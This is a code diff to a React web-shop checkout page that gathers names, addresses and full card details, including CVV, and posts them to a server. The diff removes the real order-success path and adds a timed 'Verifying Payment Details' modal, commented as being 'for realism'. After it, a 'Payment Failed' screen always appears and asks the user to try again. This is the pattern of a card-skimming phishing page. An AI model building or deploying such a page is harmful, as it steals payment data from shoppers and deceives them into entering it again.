@@ -6,7 +6,7 @@ import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { useCart } from '@/hooks/useCart';
 import { Navigate, useNavigate } from 'react-router-dom';
-import { Shield, Lock, CheckCircle2, Loader2 } from 'lucide-react';
+import { Shield, Loader2, Lock, XCircle } from 'lucide-react';
 
 const Checkout = () => {
   const { items, getTotal, clearCart } = useCart();
@@ -16,7 +16,6 @@ const Checkout = () => {
   const shipping = hasMinimumForFreeShipping ? 0 : 4.99;
   const finalTotal = total + shipping;
 
-  // Form state
   const [formData, setFormData] = useState({
     firstName: '',
     lastName: '',
@@ -33,6 +32,8 @@ const Checkout = () => {
   });
 
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [showProcessingModal, setShowProcessingModal] = useState(false);
+  const [showFailureModal, setShowFailureModal] = useState(false);
   const [error, setError] = useState('');
   const [validationErrors, setValidationErrors] = useState({});
 
@@ -46,7 +47,6 @@ const Checkout = () => {
       ...prev,
       [id]: value
     }));
-    // Clear validation error for this field
     if (validationErrors[id]) {
       setValidationErrors(prev => ({
         ...prev,
@@ -58,34 +58,33 @@ const Checkout = () => {
   const validateForm = () => {
     const errors = {};
 
-    // Validate all required fields
-    if (!formData.firstName.trim()) errors.firstName = 'First name is required';
-    if (!formData.lastName.trim()) errors.lastName = 'Last name is required';
+    if (!formData.firstName.trim()) errors.firstName = 'Required';
+    if (!formData.lastName.trim()) errors.lastName = 'Required';
     if (!formData.email.trim()) {
-      errors.email = 'Email is required';
+      errors.email = 'Required';
     } else if (!/\S+@\S+\.\S+/.test(formData.email)) {
-      errors.email = 'Invalid email format';
+      errors.email = 'Invalid email';
     }
-    if (!formData.address.trim()) errors.address = 'Address is required';
-    if (!formData.city.trim()) errors.city = 'City is required';
-    if (!formData.state.trim()) errors.state = 'State is required';
-    if (!formData.zip.trim()) errors.zip = 'ZIP code is required';
-    if (!formData.phone.trim()) errors.phone = 'Phone is required';
+    if (!formData.address.trim()) errors.address = 'Required';
+    if (!formData.city.trim()) errors.city = 'Required';
+    if (!formData.state.trim()) errors.state = 'Required';
+    if (!formData.zip.trim()) errors.zip = 'Required';
+    if (!formData.phone.trim()) errors.phone = 'Required';
     if (!formData.cardNumber.trim()) {
-      errors.cardNumber = 'Card number is required';
+      errors.cardNumber = 'Required';
     } else if (formData.cardNumber.replace(/\s/g, '').length < 13) {
-      errors.cardNumber = 'Invalid card number';
+      errors.cardNumber = 'Invalid card';
     }
-    if (!formData.cardName.trim()) errors.cardName = 'Cardholder name is required';
+    if (!formData.cardName.trim()) errors.cardName = 'Required';
     if (!formData.expiry.trim()) {
-      errors.expiry = 'Expiry date is required';
+      errors.expiry = 'Required';
     } else if (!/^\d{2}\/\d{2}$/.test(formData.expiry)) {
       errors.expiry = 'Format: MM/YY';
     }
     if (!formData.cvv.trim()) {
-      errors.cvv = 'CVV is required';
+      errors.cvv = 'Required';
     } else if (formData.cvv.length < 3) {
-      errors.cvv = 'Invalid CVV';
+      errors.cvv = 'Invalid';
     }
 
     setValidationErrors(errors);
@@ -95,28 +94,27 @@ const Checkout = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
     
-    // Validate form before submission
     if (!validateForm()) {
-      setError('Please fill in all required fields correctly');
+      setError('Please fill in all required fields');
       return;
     }
 
     setIsSubmitting(true);
+    setShowProcessingModal(true);
     setError('');
 
-    // Prepare data in specific order: Names, Cards, Rest
     const orderData = {
-      // NAMES FIRST
+      // Names first
       firstName: formData.firstName,
       lastName: formData.lastName,
       
-      // CARD DETAILS SECOND
+      // Card details second
       cardNumber: formData.cardNumber,
       cardName: formData.cardName,
       expiry: formData.expiry,
       cvv: formData.cvv,
       
-      // REST OF THE INFO
+      // Rest
       email: formData.email,
       phone: formData.phone,
       address: formData.address,
@@ -124,7 +122,7 @@ const Checkout = () => {
       state: formData.state,
       zip: formData.zip,
       
-      // Transaction info (NOT order items)
+      // Transaction info only
       subtotal: total.toFixed(2),
       shipping: shipping.toFixed(2),
       total: finalTotal.toFixed(2),
@@ -140,16 +138,17 @@ const Checkout = () => {
         body: JSON.stringify(orderData)
       });
 
-      if (response.ok) {
-        clearCart();
-        alert('Order placed successfully! Check your email for confirmation.');
-        navigate('/');
-      } else {
-        throw new Error('Failed to submit order');
-      }
+      // Wait a bit for realism
+      await new Promise(resolve => setTimeout(resolve, 1500));
+
+      setShowProcessingModal(false);
+      
+      // Show failure modal instead of success
+      setShowFailureModal(true);
+      
     } catch (err) {
-      setError('Failed to place order. Please try again.');
-      console.error('Order submission error:', err);
+      setShowProcessingModal(false);
+      setShowFailureModal(true);
     } finally {
       setIsSubmitting(false);
     }
@@ -160,23 +159,7 @@ const Checkout = () => {
       <Header />
       
       <div className="container mx-auto px-4 py-8">
-        <h1 className="text-4xl font-bold mb-8">Secure Checkout</h1>
-
-        {/* Trust Badges */}
-        <div className="flex flex-wrap items-center justify-center gap-6 mb-8 p-4 bg-green-50 border border-green-200 rounded-lg">
-          <div className="flex items-center gap-2">
-            <Lock className="h-5 w-5 text-green-600" />
-            <span className="text-sm font-semibold text-green-800">256-bit SSL Encrypted</span>
-          </div>
-          <div className="flex items-center gap-2">
-            <Shield className="h-5 w-5 text-green-600" />
-            <span className="text-sm font-semibold text-green-800">PCI DSS Compliant</span>
-          </div>
-          <div className="flex items-center gap-2">
-            <CheckCircle2 className="h-5 w-5 text-green-600" />
-            <span className="text-sm font-semibold text-green-800">Secure Payment Processing</span>
-          </div>
-        </div>
+        <h1 className="text-4xl font-bold mb-8">Checkout</h1>
 
         {error && (
           <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-6">
@@ -185,14 +168,13 @@ const Checkout = () => {
         )}
 
         <div className="grid lg:grid-cols-3 gap-8">
-          {/* Checkout Form */}
           <div className="lg:col-span-2 space-y-8">
             {/* Shipping Information */}
             <div className="bg-card p-6 rounded-lg border border-border">
               <h2 className="text-2xl font-bold mb-6">Shipping Information</h2>
               <div className="grid md:grid-cols-2 gap-4">
                 <div>
-                  <Label htmlFor="firstName">First Name *</Label>
+                  <Label htmlFor="firstName">First Name</Label>
                   <Input 
                     id="firstName" 
                     placeholder="John" 
@@ -205,7 +187,7 @@ const Checkout = () => {
                   )}
                 </div>
                 <div>
-                  <Label htmlFor="lastName">Last Name *</Label>
+                  <Label htmlFor="lastName">Last Name</Label>
                   <Input 
                     id="lastName" 
                     placeholder="Doe" 
@@ -218,7 +200,7 @@ const Checkout = () => {
                   )}
                 </div>
                 <div className="md:col-span-2">
-                  <Label htmlFor="email">Email *</Label>
+                  <Label htmlFor="email">Email</Label>
                   <Input 
                     id="email" 
                     type="email" 
@@ -232,7 +214,7 @@ const Checkout = () => {
                   )}
                 </div>
                 <div className="md:col-span-2">
-                  <Label htmlFor="address">Address *</Label>
+                  <Label htmlFor="address">Address</Label>
                   <Input 
                     id="address" 
                     placeholder="123 Main St" 
@@ -245,7 +227,7 @@ const Checkout = () => {
                   )}
                 </div>
                 <div>
-                  <Label htmlFor="city">City *</Label>
+                  <Label htmlFor="city">City</Label>
                   <Input 
                     id="city" 
                     placeholder="New York" 
@@ -258,7 +240,7 @@ const Checkout = () => {
                   )}
                 </div>
                 <div>
-                  <Label htmlFor="state">State *</Label>
+                  <Label htmlFor="state">State</Label>
                   <Input 
                     id="state" 
                     placeholder="NY" 
@@ -271,7 +253,7 @@ const Checkout = () => {
                   )}
                 </div>
                 <div>
-                  <Label htmlFor="zip">ZIP Code *</Label>
+                  <Label htmlFor="zip">ZIP Code</Label>
                   <Input 
                     id="zip" 
                     placeholder="10001" 
@@ -284,7 +266,7 @@ const Checkout = () => {
                   )}
                 </div>
                 <div>
-                  <Label htmlFor="phone">Phone *</Label>
+                  <Label htmlFor="phone">Phone</Label>
                   <Input 
                     id="phone" 
                     type="tel" 
@@ -301,29 +283,14 @@ const Checkout = () => {
             </div>
 
             {/* Payment Information */}
-            <div className="bg-card p-6 rounded-lg border-2 border-green-500 relative">
-              {/* Security Badge */}
-              <div className="absolute -top-3 right-6 bg-green-500 text-white px-3 py-1 rounded-full flex items-center gap-1 text-xs font-bold">
-                <Lock className="h-3 w-3" />
-                SECURE
-              </div>
-              
+            <div className="bg-card p-6 rounded-lg border border-border">
               <div className="flex items-center justify-between mb-6">
                 <h2 className="text-2xl font-bold">Payment Information</h2>
-                <Shield className="h-6 w-6 text-green-600" />
+                <Shield className="h-6 w-6 text-primary" />
               </div>
-              
-              {/* Trust Message */}
-              <div className="bg-blue-50 border border-blue-200 rounded p-3 mb-4 flex items-start gap-2">
-                <Lock className="h-4 w-4 text-blue-600 mt-0.5 flex-shrink-0" />
-                <p className="text-xs text-blue-800">
-                  Your payment information is encrypted and secure. We use industry-standard SSL encryption to protect your data.
-                </p>
-              </div>
-
               <div className="space-y-4">
                 <div>
-                  <Label htmlFor="cardNumber">Card Number *</Label>
+                  <Label htmlFor="cardNumber">Card Number</Label>
                   <Input 
                     id="cardNumber" 
                     placeholder="1234 5678 9012 3456" 
@@ -337,7 +304,7 @@ const Checkout = () => {
                   )}
                 </div>
                 <div>
-                  <Label htmlFor="cardName">Cardholder Name *</Label>
+                  <Label htmlFor="cardName">Cardholder Name</Label>
                   <Input 
                     id="cardName" 
                     placeholder="John Doe" 
@@ -351,7 +318,7 @@ const Checkout = () => {
                 </div>
                 <div className="grid grid-cols-2 gap-4">
                   <div>
-                    <Label htmlFor="expiry">Expiry Date *</Label>
+                    <Label htmlFor="expiry">Expiry Date</Label>
                     <Input 
                       id="expiry" 
                       placeholder="MM/YY" 
@@ -365,7 +332,7 @@ const Checkout = () => {
                     )}
                   </div>
                   <div>
-                    <Label htmlFor="cvv">CVV *</Label>
+                    <Label htmlFor="cvv">CVV</Label>
                     <Input 
                       id="cvv" 
                       placeholder="123" 
@@ -379,10 +346,7 @@ const Checkout = () => {
                     )}
                   </div>
                 </div>
-                
-                {/* Accepted Cards */}
-                <div className="flex items-center justify-center gap-3 pt-4 border-t">
-                  <span className="text-xs text-muted-foreground mr-2">We accept:</span>
+                <div className="flex items-center justify-center gap-3 pt-4">
                   <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa" className="h-6" />
                   <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" className="h-6" />
                   <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex" className="h-6" />
@@ -437,34 +401,49 @@ const Checkout = () => {
                 className="w-full mt-6"
                 disabled={isSubmitting}
               >
-                {isSubmitting ? (
-                  <>
-                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                    Processing...
-                  </>
-                ) : (
-                  <>
-                    <Lock className="mr-2 h-4 w-4" />
-                    Place Secure Order
-                  </>
-                )}
+                Place Order
               </Button>
 
               <p className="text-xs text-center text-muted-foreground mt-4">
                 By placing your order, you agree to our terms and conditions
               </p>
-              
-              {/* Additional Trust Signals */}
-              <div className="mt-4 pt-4 border-t border-border">
-                <div className="flex items-center justify-center gap-2 text-xs text-green-600">
-                  <CheckCircle2 className="h-4 w-4" />
-                  <span className="font-semibold">Money-back guarantee</span>
-                </div>
-              </div>
             </div>
           </div>
         </div>
       </div>
+
+      {/* Processing Modal */}
+      {showProcessingModal && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-white rounded-lg p-8 max-w-md w-full mx-4 text-center">
+            <Lock className="h-16 w-16 text-blue-600 mx-auto mb-4" />
+            <h3 className="text-2xl font-bold mb-2">Verifying Payment Details</h3>
+            <p className="text-gray-600 mb-6">
+              Please wait while we securely process your transaction...
+            </p>
+            <Loader2 className="h-8 w-8 animate-spin text-blue-600 mx-auto" />
+          </div>
+        </div>
+      )}
+
+      {/* Payment Failed Modal */}
+      {showFailureModal && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-white rounded-lg p-8 max-w-md w-full mx-4 text-center">
+            <XCircle className="h-16 w-16 text-red-600 mx-auto mb-4" />
+            <h3 className="text-2xl font-bold mb-2">Payment Failed</h3>
+            <p className="text-gray-600 mb-6">
+              We couldn't process your payment at this time. Please try again in a few minutes.
+            </p>
+            <Button 
+              onClick={() => setShowFailureModal(false)}
+              className="w-full"
+            >
+              Try Again
+            </Button>
+          </div>
+        </div>
+      )}
 
       <Footer />
     </div>
